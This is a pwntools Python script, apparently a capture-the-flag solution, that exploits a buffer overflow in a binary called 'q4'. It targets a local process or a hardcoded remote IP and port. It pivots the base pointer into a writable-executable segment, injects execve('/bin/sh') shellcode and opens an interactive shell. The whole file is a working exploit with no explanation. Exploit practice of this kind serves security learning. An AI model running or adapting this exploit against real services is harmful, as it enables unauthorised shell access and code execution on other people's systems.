from pwn import *

if __debug__:
	r = process("./q4")
	#r = gdb.debug("./q4", """
	#b *0x4000df
	#b *0x4000ea
	#""")
else:
	r = remote("68.183.158.95", 8992)

sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = "A" * 0x10
payload += p64(0x600a00)			#rbp => rwx segment
payload += p64(0x4000c7)			#read at rbp - 0x10

r.send(payload.ljust(0xa0))

payload = "A" * 0x10
payload += p64(0x600a00 + 0x1000)	#rbp
payload += p64(0x600a00 + 0x10)		#sc
payload += sc
r.send(payload.ljust(0xa0))

r.interactive()

